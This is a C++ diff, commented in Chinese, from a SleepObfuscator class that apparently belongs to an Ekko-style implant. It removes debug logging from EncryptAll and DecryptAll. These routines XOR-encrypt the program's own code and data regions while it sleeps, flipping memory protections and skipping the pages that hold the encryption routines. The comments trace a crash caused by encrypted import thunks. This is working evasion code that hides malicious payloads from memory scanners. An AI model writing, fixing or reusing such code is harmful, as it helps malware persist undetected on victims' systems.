@@ -217,20 +217,17 @@ static void EncryptAllPageMarker() {
 }
 
 void SleepObfuscator::EncryptAll() {
-    // ★ BUILD 567 v3.245 FIX+DIAG: 关键页跳过保护 + EK_RAW_LOG 诊断
-    //   根因: v3.244 EA+ post 未出现 → 崩溃在 EncryptAll 内部
-    //   假设: 某个 region 覆盖了 ekkoPage/encryptAllPage/xorCryptPage,
-    //         EncryptAll 加密自身代码页 → 后续执行加密字节 → 崩溃
-    //   修复: 跳过覆盖关键页的 region (深度防御)
-    //   诊断: EK_RAW_LOG 输出每个 region 处理前后的状态 (不调用 CRT 函数)
-    EK_RAW_LOG("EA start\n");
+    // ★ BUILD 567 v3.252 SIMPLIFY: 移除所有 EK_RAW_LOG 诊断 + D0/D1/E0-E3/F0-F3 页级诊断
+    //   原因: v3.245-v3.251 大量 EK_RAW_LOG 宏展开 + 诊断代码让 EncryptAll 函数 > 8KB (2 页),
+    //         函数跨越多页, 编译器重新布局代码, 导致 import thunk 移到被加密的页 → 崩溃.
+    //   诊断已完成 (v3.252 确认根因: import thunk 在 .text 段被加密), 移除诊断代码简化函数.
+    //   保留: 关键页跳过保护 (v3.245 FIX) — 防止加密 EkkoSleep/EncryptAll/DecryptAll/XorCrypt 自身.
     uintptr_t ekkoPg = GetSelfPage();
     uintptr_t encAPg = GetEncryptAllPage();
     uintptr_t decAPg = GetDecryptAllPage();
     uintptr_t xorCPg = GetXorCryptPage();
     uintptr_t sleepPg = reinterpret_cast<uintptr_t>(this) & ~0xFFFULL;
 
-    // ★ v3.125: 固定数组 — 只遍历 m_regionCount 个有效条目
     for (int ri = 0; ri < m_regionCount; ri++) {
         ProtectedRegion& region = m_regions[ri];
         uintptr_t rStart = reinterpret_cast<uintptr_t>(region.addr);
@@ -243,224 +240,21 @@ void SleepObfuscator::EncryptAll() {
         if (rStart < decAPg + 0x2000 && rEnd > decAPg) overlap = true;   // decryptAllPage 2 页
         if (rStart < xorCPg + 0x2000 && rEnd > xorCPg) overlap = true;   // xorCryptPage 2 页
         if (rStart < sleepPg + 0x2000 && rEnd > sleepPg) overlap = true; // sleepObjPage 2 页
-        if (overlap) {
-            EK_RAW_LOG("EA skip\n");
-            continue;
-        }
-
-        // 诊断: 输出当前处理的 region 索引 (前 8 个, 实际只有 6 个)
-        if (ri == 0) EK_RAW_LOG("EA r0\n");
-        else if (ri == 1) EK_RAW_LOG("EA r1\n");
-        else if (ri == 2) EK_RAW_LOG("EA r2\n");
-        else if (ri == 3) EK_RAW_LOG("EA r3\n");
-        else if (ri == 4) EK_RAW_LOG("EA r4\n");
-        else if (ri == 5) EK_RAW_LOG("EA r5\n");
-        else EK_RAW_LOG("EA rX\n");
-
-        // ★ BUILD 567 v3.246 DIAG: 对 region 3 添加精细诊断 (已知崩溃位置)
-        //   v3.245 测试: EA r3 出现, EA r4 未出现 → 崩溃在处理 region 3 时
-        //   本版添加 VP1/XC/VP2/FIC/end 精细诊断, 精确定位崩溃步骤
-        // ★ BUILD 567 v3.247 DIAG: v3.246 确认崩溃在 XorCrypt 内部 (EA r3 XC 出现, EA r3 VP2 未出现)
-        //   region 3 = 299KB, 分块 XorCrypt 每块 64KB, 精确定位崩溃块
-        //   判读: EA r3 C0-C4 表示正在处理块 0-4, EA r3 XCdone 表示 XorCrypt 完成
-        bool diagR3 = (ri == 3);
+        if (overlap) continue;
 
         if (region.isCode) {
             DWORD oldProtect;
-            if (diagR3) EK_RAW_LOG("EA r3 VP1\n");
-            if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
-                if (diagR3) EK_RAW_LOG("EA r3 VP1fail\n");
-                else EK_RAW_LOG("EA VP fail\n");
-                continue;
-            }
-            if (diagR3) {
-                // ★ v3.247: 分块 XorCrypt, 每块 64KB, 定位崩溃块
-                // ★ v3.248: 块 3 细分为 4 个 16KB 子块, 精确定位崩溃的 16KB 块
-                //   v3.247 测试: EA r3 C3 出现, EA r3 C4 未出现 → 崩溃在块 3 [192KB, 256KB)
-                SIZE_T processed = 0;
-                int chunkIdx = 0;
-                while (processed < region.size) {
-                    SIZE_T chunk = region.size - processed;
-                    if (chunk > 0x10000) chunk = 0x10000; // 64KB
-                    if (chunkIdx == 3) {
-                        // ★ v3.248: 块 3 细分为 4 个 16KB 子块
-                        // ★ v3.249: D0 (subIdx==0) 进一步细分为 4 个 4KB 页, 精确定位崩溃页
-                        //   v3.248 测试: EA r3 D0 出现, D1 未出现 → 崩溃在 D0 [192KB, 208KB)
-                        //   D0 范围 [dllBase+0x5C000, dllBase+0x60000) 跨越 .text/.data/.rdata
-                        //   E0 = [0x5C000, 0x5D000) — .text 末尾代码
-                        //   E1 = [0x5D000, 0x5E000) — .text/.data 边界
-                        //   E2 = [0x5E000, 0x5F000) — .data 段 (全局变量)
-                        //   E3 = [0x5F000, 0x60000) — .rdata 段开头
-                        EK_RAW_LOG("EA r3 C3\n");
-                        SIZE_T subProc = 0;
-                        int subIdx = 0;
-                        while (subProc < chunk) {
-                            SIZE_T sub = chunk - subProc;
-                            if (sub > 0x4000) sub = 0x4000; // 16KB
-                            if (subIdx == 0) EK_RAW_LOG("EA r3 D0\n");
-                            else if (subIdx == 1) EK_RAW_LOG("EA r3 D1\n");
-                            else if (subIdx == 2) EK_RAW_LOG("EA r3 D2\n");
-                            else if (subIdx == 3) EK_RAW_LOG("EA r3 D3\n");
-                            else EK_RAW_LOG("EA r3 DX\n");
-                            // ★ v3.249: D0 内部页级诊断
-                            // ★ v3.250: D1 内部页级诊断 (D0 完整完成, 崩溃在 D1)
-                            if (subIdx == 0) {
-                                SIZE_T pageProc = 0;
-                                int pageIdx = 0;
-                                while (pageProc < sub) {
-                                    SIZE_T page = sub - pageProc;
-                                    if (page > 0x1000) page = 0x1000; // 4KB
-                                    if (pageIdx == 0) EK_RAW_LOG("EA r3 E0\n");
-                                    else if (pageIdx == 1) EK_RAW_LOG("EA r3 E1\n");
-                                    else if (pageIdx == 2) EK_RAW_LOG("EA r3 E2\n");
-                                    else if (pageIdx == 3) EK_RAW_LOG("EA r3 E3\n");
-                                    else EK_RAW_LOG("EA r3 EX\n");
-                                    XorCrypt((BYTE*)region.addr + processed + subProc + pageProc, page, region.xorKey);
-                                    pageProc += page;
-                                    pageIdx++;
-                                }
-                                EK_RAW_LOG("EA r3 D0done\n");
-                            } else if (subIdx == 1) {
-                                // ★ v3.250: D1 内部页级诊断
-                                //   v3.249 测试: D0 完整完成 (D0done 出现), 崩溃在 D1 [208KB, 224KB)
-                                //   D1 范围 [dllBase+0x60000, dllBase+0x64000) 完全在 .rdata 段内
-                                //   F0 = [0x60000, 0x61000) — .rdata 段
-                                //   F1 = [0x61000, 0x62000) — .rdata 段
-                                //   F2 = [0x62000, 0x63000) — .rdata 段
-                                //   F3 = [0x63000, 0x64000) — .rdata 段
-                                SIZE_T pageProc = 0;
-                                int pageIdx = 0;
-                                while (pageProc < sub) {
-                                    SIZE_T page = sub - pageProc;
-                                    if (page > 0x1000) page = 0x1000; // 4KB
-                                    if (pageIdx == 0) EK_RAW_LOG("EA r3 F0\n");
-                                    else if (pageIdx == 1) EK_RAW_LOG("EA r3 F1\n");
-                                    else if (pageIdx == 2) EK_RAW_LOG("EA r3 F2\n");
-                                    else if (pageIdx == 3) EK_RAW_LOG("EA r3 F3\n");
-                                    else EK_RAW_LOG("EA r3 FX\n");
-                                    XorCrypt((BYTE*)region.addr + processed + subProc + pageProc, page, region.xorKey);
-                                    pageProc += page;
-                                    pageIdx++;
-                                }
-                                EK_RAW_LOG("EA r3 D1done\n");
-                            } else {
-                                XorCrypt((BYTE*)region.addr + processed + subProc, sub, region.xorKey);
-                            }
-                            subProc += sub;
-                            subIdx++;
-                        }
-                        EK_RAW_LOG("EA r3 C3done\n");
-                    } else {
-                        if (chunkIdx == 0) EK_RAW_LOG("EA r3 C0\n");
-                        else if (chunkIdx == 1) EK_RAW_LOG("EA r3 C1\n");
-                        else if (chunkIdx == 2) EK_RAW_LOG("EA r3 C2\n");
-                        else if (chunkIdx == 4) EK_RAW_LOG("EA r3 C4\n");
-                        else EK_RAW_LOG("EA r3 CX\n");
-                        XorCrypt((BYTE*)region.addr + processed, chunk, region.xorKey);
-                    }
-                    processed += chunk;
-                    chunkIdx++;
-                }
-                EK_RAW_LOG("EA r3 XCdone\n");
-            } else {
-                XorCrypt(region.addr, region.size, region.xorKey);
-            }
-            if (diagR3) EK_RAW_LOG("EA r3 VP2\n");
+            if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) continue;
+            XorCrypt(region.addr, region.size, region.xorKey);
             VirtualProtect(region.addr, region.size, oldProtect, &oldProtect);
-            if (diagR3) EK_RAW_LOG("EA r3 FIC\n");
             FlushInstructionCache(GetCurrentProcess(), region.addr, region.size);
         } else {
-            // ★ v3.37 FIX: 检查 VirtualProtect 返回值
             DWORD oldProtect = 0;
-            if (diagR3) EK_RAW_LOG("EA r3 VP1\n");
-            if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
-                if (diagR3) EK_RAW_LOG("EA r3 VP1fail\n");
-                else EK_RAW_LOG("EA VP fail\n");
-                continue;
-            }
-            if (diagR3) {
-                // ★ v3.247: 分块 XorCrypt, 每块 64KB, 定位崩溃块
-                // ★ v3.248: 块 3 细分为 4 个 16KB 子块, 精确定位崩溃的 16KB 块
-                // ★ v3.249: D0 进一步细分为 4 个 4KB 页, 精确定位崩溃页
-                SIZE_T processed = 0;
-                int chunkIdx = 0;
-                while (processed < region.size) {
-                    SIZE_T chunk = region.size - processed;
-                    if (chunk > 0x10000) chunk = 0x10000; // 64KB
-                    if (chunkIdx == 3) {
-                        // ★ v3.249: D0 内部页级诊断 (对称 isCode 分支)
-                        EK_RAW_LOG("EA r3 C3\n");
-                        SIZE_T subProc = 0;
-                        int subIdx = 0;
-                        while (subProc < chunk) {
-                            SIZE_T sub = chunk - subProc;
-                            if (sub > 0x4000) sub = 0x4000; // 16KB
-                            if (subIdx == 0) EK_RAW_LOG("EA r3 D0\n");
-                            else if (subIdx == 1) EK_RAW_LOG("EA r3 D1\n");
-                            else if (subIdx == 2) EK_RAW_LOG("EA r3 D2\n");
-                            else if (subIdx == 3) EK_RAW_LOG("EA r3 D3\n");
-                            else EK_RAW_LOG("EA r3 DX\n");
-                            if (subIdx == 0) {
-                                SIZE_T pageProc = 0;
-                                int pageIdx = 0;
-                                while (pageProc < sub) {
-                                    SIZE_T page = sub - pageProc;
-                                    if (page > 0x1000) page = 0x1000; // 4KB
-                                    if (pageIdx == 0) EK_RAW_LOG("EA r3 E0\n");
-                                    else if (pageIdx == 1) EK_RAW_LOG("EA r3 E1\n");
-                                    else if (pageIdx == 2) EK_RAW_LOG("EA r3 E2\n");
-                                    else if (pageIdx == 3) EK_RAW_LOG("EA r3 E3\n");
-                                    else EK_RAW_LOG("EA r3 EX\n");
-                                    XorCrypt((BYTE*)region.addr + processed + subProc + pageProc, page, region.xorKey);
-                                    pageProc += page;
-                                    pageIdx++;
-                                }
-                                EK_RAW_LOG("EA r3 D0done\n");
-                            } else if (subIdx == 1) {
-                                // ★ v3.250: D1 内部页级诊断 (对称 isCode 分支)
-                                SIZE_T pageProc = 0;
-                                int pageIdx = 0;
-                                while (pageProc < sub) {
-                                    SIZE_T page = sub - pageProc;
-                                    if (page > 0x1000) page = 0x1000; // 4KB
-                                    if (pageIdx == 0) EK_RAW_LOG("EA r3 F0\n");
-                                    else if (pageIdx == 1) EK_RAW_LOG("EA r3 F1\n");
-                                    else if (pageIdx == 2) EK_RAW_LOG("EA r3 F2\n");
-                                    else if (pageIdx == 3) EK_RAW_LOG("EA r3 F3\n");
-                                    else EK_RAW_LOG("EA r3 FX\n");
-                                    XorCrypt((BYTE*)region.addr + processed + subProc + pageProc, page, region.xorKey);
-                                    pageProc += page;
-                                    pageIdx++;
-                                }
-                                EK_RAW_LOG("EA r3 D1done\n");
-                            } else {
-                                XorCrypt((BYTE*)region.addr + processed + subProc, sub, region.xorKey);
-                            }
-                            subProc += sub;
-                            subIdx++;
-                        }
-                        EK_RAW_LOG("EA r3 C3done\n");
-                    } else {
-                        if (chunkIdx == 0) EK_RAW_LOG("EA r3 C0\n");
-                        else if (chunkIdx == 1) EK_RAW_LOG("EA r3 C1\n");
-                        else if (chunkIdx == 2) EK_RAW_LOG("EA r3 C2\n");
-                        else if (chunkIdx == 4) EK_RAW_LOG("EA r3 C4\n");
-                        else EK_RAW_LOG("EA r3 CX\n");
-                        XorCrypt((BYTE*)region.addr + processed, chunk, region.xorKey);
-                    }
-                    processed += chunk;
-                    chunkIdx++;
-                }
-                EK_RAW_LOG("EA r3 XCdone\n");
-            } else {
-                XorCrypt(region.addr, region.size, region.xorKey);
-            }
-            if (diagR3) EK_RAW_LOG("EA r3 VP2\n");
+            if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) continue;
+            XorCrypt(region.addr, region.size, region.xorKey);
             VirtualProtect(region.addr, region.size, oldProtect, &oldProtect);
         }
-        if (diagR3) EK_RAW_LOG("EA r3 end\n");
     }
-    EK_RAW_LOG("EA done\n");
 }
 
 // ★ BUILD 544: DecryptAll 页面标记 — 紧邻 DecryptAll 定义确保同 4KB 页
@@ -470,10 +264,9 @@ static void DecryptAllPageMarker() {
 }
 
 void SleepObfuscator::DecryptAll() {
-    // ★ BUILD 567 v3.245 FIX+DIAG: 关键页跳过保护 + EK_RAW_LOG 诊断 (对称 EncryptAll)
-    //   如果 EncryptAll 跳过了某个 region (覆盖关键页), DecryptAll 也必须跳过,
-    //   否则 DecryptAll 会解密一个未被加密的 region → 数据损坏
-    EK_RAW_LOG("DA start\n");
+    // ★ BUILD 567 v3.252 SIMPLIFY: 移除所有 EK_RAW_LOG 诊断 (对称 EncryptAll)
+    //   原因: 同 EncryptAll — 简化函数体积, 避免编译器重新布局代码导致 import thunk 位移.
+    //   保留: 关键页跳过保护 (v3.245 FIX) — 必须与 EncryptAll 对称跳过, 否则解密未加密的 region → 数据损坏.
     uintptr_t ekkoPg = GetSelfPage();
     uintptr_t encAPg = GetEncryptAllPage();
     uintptr_t decAPg = GetDecryptAllPage();
@@ -493,32 +286,22 @@ void SleepObfuscator::DecryptAll() {
         if (rStart < decAPg + 0x2000 && rEnd > decAPg) overlap = true;
         if (rStart < xorCPg + 0x2000 && rEnd > xorCPg) overlap = true;
         if (rStart < sleepPg + 0x2000 && rEnd > sleepPg) overlap = true;
-        if (overlap) {
-            EK_RAW_LOG("DA skip\n");
-            continue;
-        }
+        if (overlap) continue;
 
         if (region.isCode) {
             DWORD oldProtect;
-            if (!VirtualProtect(region.addr, region.size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                EK_RAW_LOG("DA VP fail\n");
-                continue;
-            }
+            if (!VirtualProtect(region.addr, region.size, PAGE_EXECUTE_READWRITE, &oldProtect)) continue;
             XorCrypt(region.addr, region.size, region.xorKey);
             VirtualProtect(region.addr, region.size, PAGE_EXECUTE_READ, &oldProtect);
             FlushInstructionCache(GetCurrentProcess(), region.addr, region.size);
         } else {
             // ★ v3.37 FIX: 检查 VirtualProtect 返回值 (同 EncryptAll)
             DWORD oldProtect = 0;
-            if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
-                EK_RAW_LOG("DA VP fail\n");
-                continue;
-            }
+            if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) continue;
             XorCrypt(region.addr, region.size, region.xorKey);
             VirtualProtect(region.addr, region.size, oldProtect, &oldProtect);
         }
     }
-    EK_RAW_LOG("DA done\n");
 }
 
 void SleepObfuscator::ObfuscatedSleep(DWORD milliseconds) {
